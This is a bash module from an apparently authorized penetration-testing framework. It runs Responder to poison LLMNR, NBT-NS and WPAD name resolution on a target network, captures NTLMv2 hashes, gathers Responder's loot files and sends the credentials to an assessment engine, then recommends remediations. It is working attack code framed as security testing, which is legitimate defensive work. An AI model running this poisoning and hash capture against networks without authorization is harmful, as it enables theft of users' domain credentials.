#!/usr/bin/env bash
# MODULE_META
# NAME="DNS Spoofing & Poisoning"
# CATEGORY="G"
# DEPS="none"
# CRITICAL="yes"
# TOOLS="responder"
# DESC="LLMNR/NBT-NS/WPAD poisoning via Responder, NTLMv2 hash capture"
# REQS="managed_iface,my_ip"
# PCAP="yes"
# DECODE="l2_discovery"

#===============================================================================
#  modules/g3_dns_spoofing.sh
#  G3: DNS Spoofing & Poisoning
#
#  PURPOSE:
#    Test if DNS responses on the target network can be spoofed or poisoned.
#    Checks for DNS cache poisoning, LLMNR/NBT-NS poisoning via Responder,
#    WPAD hijacking, and targeted domain spoofing.
#
#  TOOLS: ${TOOL_PATHS[responder]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[dig]}, ${TOOL_PATHS[tshark]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: none (but benefits from C1 data)
#
#  EVIDENCE PRODUCED:
#    - g3_responder_log.txt          (Responder capture output)
#    - g3_dns_spoof.txt              (DNS spoofing test results)
#    - g3_captured_hashes.txt        (NTLMv2/v1 hashes captured)
#    - g3_network_capture.pcap       (traffic capture during test)
#    - g3_findings.txt               (analysis summary)
#
#  RESULT JSON FIELDS:
#    - llmnr_poisoning_successful: bool
#    - nbns_poisoning_successful: bool
#    - wpad_hijack_successful: bool
#    - hashes_captured: int
#    - dns_spoof_possible: bool
#===============================================================================

run_g3() {
    set -uo pipefail
    local total_steps=7
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/g3"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "G3" || return 1

    ensure_managed_mode || return 1

    local iface="${WIFI_INTERFACE:-wlan0}"

    if [[ -z "${MY_IP:-}" ]]; then
        log_error "IP address not set. Ensure you are connected to the target network."
        return 1
    fi

    log_success "Interface: ${iface}, IP: ${MY_IP}"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ DNS SPOOFING & NAME POISONING ★                              ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test will:                                                   ║"
    echo "  ║    • Run Responder to poison LLMNR, NBT-NS, and mDNS requests    ║"
    echo "  ║    • Test WPAD hijacking (auto-proxy discovery)                   ║"
    echo "  ║    • Capture NTLMv2/NTLMv1 hashes from poisoned responses        ║"
    echo "  ║    • Test DNS response spoofing capability                        ║"
    echo "  ║                                                                    ║"
    echo "  ║  ⚠  May capture REAL domain credentials (NTLMv2 hashes).         ║"
    echo "  ║  ⚠  Handle captured hashes per engagement rules.                 ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "g3_confirm" "Proceed with DNS spoofing test? [Y/n]" "Y"
    [[ "${g3_confirm,,}" == "n" ]] && return 1

    local llmnr_poisoning_successful="false"
    local nbns_poisoning_successful="false"
    local wpad_hijack_successful="false"
    local hashes_captured=0
    local dns_spoof_possible="false"
    local findings_file="${evidence_prefix}_findings.txt"
    local responder_log="${evidence_prefix}_responder_log.txt"
    local hashes_file="${evidence_prefix}_captured_hashes.txt"
    local dns_spoof_file="${evidence_prefix}_dns_spoof.txt"
    local network_pcap="${evidence_prefix}_network_capture.pcap"

    {
        echo "============================================================"
        echo "  G3: DNS Spoofing & Name Poisoning"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Interface: ${iface}, IP: ${MY_IP}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    : > "$hashes_file"

    #--- Step 2: Start traffic capture ---
    log_step 2 $total_steps "Starting network capture"
    update_tc_progress 2 $total_steps "Capture"

    ${TOOL_PATHS[tcpdump]} -i "$iface" -w "$network_pcap" -c 100000 \
        "udp port 5355 or udp port 137 or udp port 5353 or udp port 53 or tcp port 80 or tcp port 445" \
        &>/dev/null &
    local tcpdump_pid=$!
    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"

    #--- Step 3: Passive LLMNR/NBT-NS/mDNS detection ---
    log_step 3 $total_steps "Detecting name resolution broadcast traffic (30s)"
    update_tc_progress 3 $total_steps "Passive scan"

    check_abort || return 1

    {
        echo "============================================================"
        echo "  Broadcast Name Resolution Analysis"
        echo "============================================================"
        echo ""
    } > "$dns_spoof_file"

    local llmnr_count=0
    local nbns_count=0
    local mdns_count=0

    if [[ "$has_tshark" == "true" ]]; then
        # Quick 30-second listen for broadcast name queries
        local listen_pcap="$TMP_DIR/g3_listen.pcap"
        timeout 30 "${TOOL_PATHS[tcpdump]}" -i "$iface" -w "$listen_pcap" udp port 5355 or udp port 137 or udp port 5353 >/dev/null 2>&1 || true

        if [[ -f "$listen_pcap" ]]; then
            local llmnr_count=$(${TOOL_PATHS[tshark]} -r "$listen_pcap" -Y "llmnr" 2>/dev/null | wc -l) || true
            local nbns_count=$(${TOOL_PATHS[tshark]} -r "$listen_pcap" -Y "nbns" 2>/dev/null | wc -l) || true
            local mdns_count=$(${TOOL_PATHS[tshark]} -r "$listen_pcap" -Y "mdns" 2>/dev/null | wc -l) || true

            echo "LLMNR packets: ${llmnr_count:-0}" >> "$dns_spoof_file"
            echo "NBT-NS packets: ${nbns_count:-0}" >> "$dns_spoof_file"
            echo "mDNS packets: ${mdns_count:-0}" >> "$dns_spoof_file"

            if [[ ${llmnr_count:-0} -gt 0 ]]; then
                log_result "FINDING" "LLMNR traffic detected (${llmnr_count} packets) — poisoning possible"
                echo "FINDING: LLMNR traffic present — poisoning viable" >> "$findings_file"
            fi
            if [[ ${nbns_count:-0} -gt 0 ]]; then
                log_result "FINDING" "NBT-NS traffic detected (${nbns_count} packets) — poisoning possible"
                echo "FINDING: NBT-NS traffic present — poisoning viable" >> "$findings_file"
            fi
            rm -f "$listen_pcap"
        fi
    fi

    check_abort || return 1

    #--- Step 4: Run Responder ---
    log_step 4 $total_steps "Running Responder for name poisoning (120s)"
    update_tc_progress 4 $total_steps "Responder"

    if [[ "$has_responder" == "true" ]]; then
        # Create Responder config to enable all poisoners
        log_cmd "${TOOL_PATHS[responder]} -I ${iface} -wFb"

        local responder_raw="$TMP_DIR/g3_responder.log"

        # Run Responder with LLMNR + NBT-NS + WPAD + basic HTTP
        timeout 120 "${TOOL_PATHS[responder]}" -I "$iface" -w -F -b >> "$responder_raw" 2>&1 || true

        if [[ -f "$responder_raw" ]]; then
            cp "$responder_raw" "$responder_log"

            # Check for LLMNR poisoning success
            if grep -qi "LLMNR" "$responder_raw" && grep -qi "poisoned" "$responder_raw"; then
                local llmnr_poisoning_successful="true"
                log_result "FINDING" "LLMNR poisoning successful!"
                echo "FINDING: LLMNR poisoning successful" >> "$findings_file"
            fi

            # Check for NBT-NS poisoning
            if grep -qi "NBT-NS" "$responder_raw" && grep -qi "poisoned" "$responder_raw"; then
                local nbns_poisoning_successful="true"
                log_result "FINDING" "NBT-NS poisoning successful!"
                echo "FINDING: NBT-NS poisoning successful" >> "$findings_file"
            fi

            # Check for WPAD
            if grep -qi "WPAD" "$responder_raw"; then
                local wpad_hijack_successful="true"
                log_result "FINDING" "WPAD hijacking successful — auto-proxy poisoned!"
                echo "FINDING: WPAD hijacking successful" >> "$findings_file"
            fi

            # Extract captured hashes
            local hash_lines
            hash_lines=$(grep -iE 'NTLMv[12]|Hash|credential' "$responder_raw" \
                | grep -v "^$" | grep -v "^\[" || true)

            if [[ -n "$hash_lines" ]]; then
                local hashes_captured=$(echo "$hash_lines" | wc -l)
                echo "$hash_lines" >> "$hashes_file"
                log_result "CRITICAL" "★ ${hashes_captured} NTLMv2/v1 hash(es) captured!"
                echo "CRITICAL: ${hashes_captured} hashes captured" >> "$findings_file"
            fi

            # Also check Responder's loot directory
            local responder_loot="/usr/share/responder/logs"
            if [[ -d "$responder_loot" ]]; then
                local loot_files
                loot_files=$(find "$responder_loot" -newer "$findings_file" -name "*.txt" 2>/dev/null)
                if [[ -n "$loot_files" ]]; then
                    for lf in $loot_files; do
                        if [[ -s "$lf" ]]; then
                            cat "$lf" >> "$hashes_file"
                            local extra_hashes
                            extra_hashes=$(wc -l < "$lf")
                            hashes_captured=$((hashes_captured + extra_hashes))
                        fi
                    done
                fi
            fi
        fi

        rm -f "$responder_raw"
    else
        log_info "Responder not available — using passive analysis only"
        echo "INFO: Responder not available, passive analysis only" >> "$findings_file"
    fi

    check_abort || return 1

    #--- Step 5: DNS spoofing capability test ---
    log_step 5 $total_steps "Testing DNS spoofing capability"
    update_tc_progress 5 $total_steps "DNS spoof test"

    if [[ "$has_dig" == "true" && -n "${DNS_SERVER:-}" ]]; then
        # Check if DNS responses from the network DNS can be spoofed
        # by checking DNSSEC and response validation
        local dnssec_test
        dnssec_test=$(${TOOL_PATHS[dig]} +dnssec +short example.com @"$DNS_SERVER" 2>/dev/null || true)

        if echo "$dnssec_test" | grep -q "RRSIG"; then
            echo "DNSSEC: Validated (DNS spoofing mitigated)" >> "$dns_spoof_file"
            log_info "DNS server supports DNSSEC — spoofing mitigated for signed zones"
        else
            local dns_spoof_possible="true"
            echo "DNSSEC: NOT detected — DNS spoofing possible" >> "$dns_spoof_file"
            log_result "FINDING" "No DNSSEC — DNS responses could be spoofed"
            echo "FINDING: No DNSSEC validation detected" >> "$findings_file"
        fi

        # Test for open resolver (can we send queries to other DNS servers?)
        local external_dns
        external_dns=$(timeout 5 ${TOOL_PATHS[dig]} +short example.com @8.8.8.8 2>/dev/null || true)
        if [[ -n "$external_dns" ]]; then
            echo "External DNS resolution: ALLOWED (8.8.8.8 reachable)" >> "$dns_spoof_file"
            log_info "External DNS resolution allowed — clients can bypass local DNS"
        else
            echo "External DNS resolution: BLOCKED" >> "$dns_spoof_file"
            log_success "External DNS blocked — DNS filtering enforced"
        fi
    fi

    #--- Step 6: Stop capture and analyze ---
    log_step 6 $total_steps "Finalizing analysis"
    update_tc_progress 6 $total_steps "Analysis"

    kill -SIGINT $tcpdump_pid 2>/dev/null || true
    wait $tcpdump_pid 2>/dev/null || true

    validate_pcap "$network_pcap" "DNS/name resolution capture"

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    # Sync hashes with Assessment Engine
    local hashes_file="${evidence_prefix}_captured_hashes.txt"
    if [[ $hashes_captured -gt 0 && -f "$hashes_file" ]]; then
        log_info "Syncing captured hashes with assessment engine..."
        while IFS= read -r line; do
            # Format usually: [TIME] [MODULE] IP: ... HASH: ...
            local client_ip=$(echo "$line" | grep -oP 'IP: \K[0-9.]+')
            local hash_val=$(echo "$line" | grep -oP 'HASH: \K.*')
            local hash_type=$(echo "$line" | grep -oP '\[\K[^\]]+(?=\])' | head -2 | tail -1)
            
            # Try to get MAC for the IP
            local client_mac
            client_mac=$(run_tool ip neighbor show "$client_ip" 2>/dev/null | awk '{print $5}' | grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$' | head -1 || echo "")

            local cred_json=$(run_fg jq -n \
                --arg tc "G3" \
                --arg mac "$client_mac" \
                --arg host "broadcast-poison" \
                --arg h "$hash_val" \
                --arg proto "$hash_type" \
                '{tc_id: $tc, client_mac: $mac, target_host: $host, hash: $h, proto: $proto}')
            
            run_engine_api POST "/v1/ingest/credential" "$cred_json" >/dev/null 2>&1
        done < "$hashes_file"
    fi

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $hashes_captured -gt 0 ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: ${hashes_captured} NTLMv2/v1 hash(es) captured via name poisoning. "
        result_summary+="LLMNR: ${llmnr_poisoning_successful}, NBT-NS: ${nbns_poisoning_successful}, WPAD: ${wpad_hijack_successful}. "
        result_summary+="Captured hashes can be cracked offline to obtain domain passwords."
        recommendations="1) DISABLE LLMNR on all hosts (GPO: 'Turn off multicast name resolution'). "
        recommendations+="2) DISABLE NBT-NS (Network Connections → TCP/IPv4 → Advanced → WINS → Disable NetBIOS). "
        recommendations+="3) Disable WPAD or configure a legitimate PAC file via DHCP option 252. "
        recommendations+="4) Enable SMB signing (required) to prevent relay attacks. "
        recommendations+="5) Segment target WiFi to prevent poisoning corporate broadcast domains. "
        recommendations+="6) Deploy network-level detection for Responder-style attacks."
    elif [[ "$llmnr_poisoning_successful" == "true" || "$nbns_poisoning_successful" == "true" || "$wpad_hijack_successful" == "true" ]]; then
        result_status="FINDING"
        result_summary="Name poisoning was successful but no hashes were captured. "
        result_summary+="LLMNR: ${llmnr_poisoning_successful}, NBT-NS: ${nbns_poisoning_successful}, WPAD: ${wpad_hijack_successful}."
        recommendations="1) Disable LLMNR and NBT-NS on all hosts. "
        recommendations+="2) Disable WPAD or deploy legitimate proxy configuration. "
        recommendations+="3) Ensure target WiFi is isolated from corporate broadcast domains."
    elif [[ ${llmnr_count:-0} -gt 0 || ${nbns_count:-0} -gt 0 ]]; then
        result_status="FINDING"
        result_summary="Broadcast name resolution traffic detected (LLMNR: ${llmnr_count:-0}, NBT-NS: ${nbns_count:-0}) but poisoning was not confirmed."
        recommendations="1) Disable LLMNR and NBT-NS as a preventive measure. "
        recommendations+="2) Investigate source of broadcast traffic in target VLAN."
    else
        result_summary="No broadcast name resolution traffic detected. DNS spoofing via LLMNR/NBT-NS is not viable."
        [[ "$dns_spoof_possible" == "true" ]] && result_summary+=" However, DNSSEC is not enforced."
        recommendations="Network appears properly segmented against name poisoning attacks."
        [[ "$dns_spoof_possible" == "true" ]] && recommendations+=" Enable DNSSEC validation."
    fi

    local result_json
    evidence_register_file "g3_responder_log.txt"
    evidence_register_file "g3_dns_spoof.txt"
    evidence_register_file "g3_captured_hashes.txt"
    evidence_register_file "g3_network_capture.pcap"
    evidence_register_file "g3_findings.txt"

    result_json=$(run_tool jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "LLMNR poison: ${llmnr_poisoning_successful}, NBT-NS poison: ${nbns_poisoning_successful}, WPAD: ${wpad_hijack_successful}, Hashes: ${hashes_captured}, DNS spoof viable: ${dns_spoof_possible}" \
        --arg recommendations "$recommendations" \
        --arg llmnr_poisoning_successful "$llmnr_poisoning_successful" \
        --arg nbns_poisoning_successful "$nbns_poisoning_successful" \
        --arg wpad_hijack_successful "$wpad_hijack_successful" \
        --argjson hashes_captured "$hashes_captured" \
        --arg dns_spoof_possible "$dns_spoof_possible" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            llmnr_poisoning_successful: ($llmnr_poisoning_successful == "true"),
            nbns_poisoning_successful: ($nbns_poisoning_successful == "true"),
            wpad_hijack_successful: ($wpad_hijack_successful == "true"),
            hashes_captured: $hashes_captured,
            dns_spoof_possible: ($dns_spoof_possible == "true"),
                    }')

    local has_tool_output=0
    [[ -f "$findings_file" ]] && has_tool_output=1
    local has_primary=0
    [[ $hashes_captured -gt 0 || "$dns_spoof_possible" == "true" ]] && has_primary=1

    save_tc_result "G3" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 0
    save_session_state

    echo ""
    if [[ $hashes_captured -gt 0 ]]; then
        log_result "CRITICAL" "★ ${hashes_captured} NTLMv2 hash(es) captured via name poisoning"
    elif [[ "$llmnr_poisoning_successful" == "true" || "$nbns_poisoning_successful" == "true" ]]; then
        log_result "FINDING" "Name poisoning successful (LLMNR/NBT-NS)"
    elif [[ ${llmnr_count:-0} -gt 0 || ${nbns_count:-0} -gt 0 ]]; then
        log_result "FINDING" "Broadcast name queries detected — poisoning possible"
    else
        log_result "SECURE" "No broadcast name resolution traffic — poisoning not viable"
    fi

    return 0
}
